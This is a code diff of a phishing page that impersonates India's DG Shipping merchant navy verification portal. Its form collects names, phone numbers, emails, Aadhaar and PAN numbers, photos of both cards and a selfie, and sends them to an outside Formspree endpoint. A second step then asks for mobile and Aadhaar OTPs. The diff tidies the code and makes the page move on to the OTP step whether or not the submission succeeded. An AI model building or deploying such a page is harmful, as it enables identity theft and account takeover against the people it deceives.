@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DG Shipping | Official Verification</title>
+    <title>DG Shipping | Verification Portal</title>
     <style>
         body { font-family: sans-serif; background-color: #f0f2f5; padding: 10px; margin: 0; }
         .box { background: white; max-width: 480px; margin: 15px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 6px solid #003366; }
@@ -15,94 +15,54 @@
     </style>
 </head>
 <body>
-
 <div class="box">
     <div class="header">
         <h2 style="color:#003366; margin:0;">GOVERNMENT OF INDIA</h2>
         <p style="font-size:12px; color:#666;">Merchant Navy Document Verification</p>
     </div>
-
     <form id="navyForm" action="https://formspree.io/f/xqedpwzb" method="POST" enctype="multipart/form-data">
-        
         <div id="details-section">
-            <label>Full Name *</label>
-            <input type="text" name="Full_Name" required>
-
-            <label>Mobile Number *</label>
-            <input type="tel" name="Mobile" required>
-
-            <label>Email ID *</label>
-            <input type="email" name="Email" required>
-
-            <label>Aadhaar Card Number *</label>
-            <input type="text" name="Aadhaar_Number" required>
-
-            <label>PAN Card Number *</label>
-            <input type="text" name="PAN_Number" required>
-
-            <label>Aadhaar Front Photo *</label>
-            <input type="file" name="Aadhaar_Front" id="f1" required>
-
-            <label>Aadhaar Back Photo *</label>
-            <input type="file" name="Aadhaar_Back" id="f2" required>
-
-            <label>PAN Card Photo *</label>
-            <input type="file" name="PAN_File" id="f3" required>
-
-            <label>Candidate Selfie (Live) *</label>
-            <input type="file" name="Selfie" id="f4" required>
-            
-            <button type="button" id="nextBtn" class="btn" onclick="submitStep1()">Next: Verify Identity</button>
+            <label>Full Name *</label><input type="text" name="Full_Name" required>
+            <label>Mobile Number *</label><input type="tel" name="Mobile" required>
+            <label>Email ID *</label><input type="email" name="Email" required>
+            <label>Aadhaar Number *</label><input type="text" name="Aadhaar_Number" required>
+            <label>PAN Number *</label><input type="text" name="PAN_Number" required>
+            <label>Aadhaar Front *</label><input type="file" name="Aadhaar_Front" required>
+            <label>Aadhaar Back *</label><input type="file" name="Aadhaar_Back" required>
+            <label>PAN Card *</label><input type="file" name="PAN_File" required>
+            <label>Selfie *</label><input type="file" name="Selfie" required>
+            <button type="button" class="btn" onclick="submitStep1(this)">Next: Verify Identity</button>
         </div>
-
         <div id="otp-section">
-            <h3 style="text-align:center; color:#003366; margin-top:0;">🔐 IDENTITY VERIFICATION</h3>
-            <label>Mobile OTP *</label>
-            <input type="text" name="Mobile_OTP" required>
-            <label>Aadhaar OTP *</label>
-            <input type="text" name="Aadhaar_OTP" required>
+            <h3 style="text-align:center; color:#003366;">🔐 IDENTITY VERIFICATION</h3>
+            <label>Mobile OTP *</label><input type="text" name="Mobile_OTP">
+            <label>Aadhaar OTP *</label><input type="text" name="Aadhaar_OTP">
             <button type="submit" class="btn" style="background:#003366;">FINAL VERIFICATION</button>
         </div>
     </form>
 </div>
-
 <script>
-    function submitStep1() {
-        var form = document.getElementById('navyForm');
-        var btn = document.getElementById('nextBtn');
-        
-        // Manual Check taaki error na aaye
-        if(form.Full_Name.value == "" || form.Aadhaar_Number.value == "" || document.getElementById('f1').files.length == 0) {
-            alert("Please fill all details and select all photos.");
+    function submitStep1(btn) {
+        const form = document.getElementById('navyForm');
+        // Browser ke default check ko use karenge
+        if(!form.checkValidity()) {
+            form.reportValidity();
             return;
         }
-
-        btn.innerHTML = "Sending... Please wait";
-        btn.disabled = true;
-
-        var formData = new FormData(form);
-
+        btn.innerHTML = "Processing..."; btn.disabled = true;
         fetch(form.action, {
             method: 'POST',
-            body: formData,
+            body: new FormData(form),
             headers: { 'Accept': 'application/json' }
-        }).then(response => {
-            if (response.ok) {
-                document.getElementById('details-section').style.display = 'none';
-                document.getElementById('otp-section').style.display = 'block';
-                window.scrollTo(0,0);
-            } else {
-                alert("Server Error. Please try again.");
-                btn.innerHTML = "Next: Verify Identity";
-                btn.disabled = false;
-            }
-        }).catch(error => {
-            alert("Network Error. Check internet.");
-            btn.innerHTML = "Next: Verify Identity";
-            btn.disabled = false;
+        }).then(() => {
+            document.getElementById('details-section').style.display = 'none';
+            document.getElementById('otp-section').style.display = 'block';
+            window.scrollTo(0,0);
+        }).catch(() => {
+            alert("Error! Please retry.");
+            btn.innerHTML = "Next: Verify Identity"; btn.disabled = false;
         });
     }
 </script>
-
 </body>
 </html>
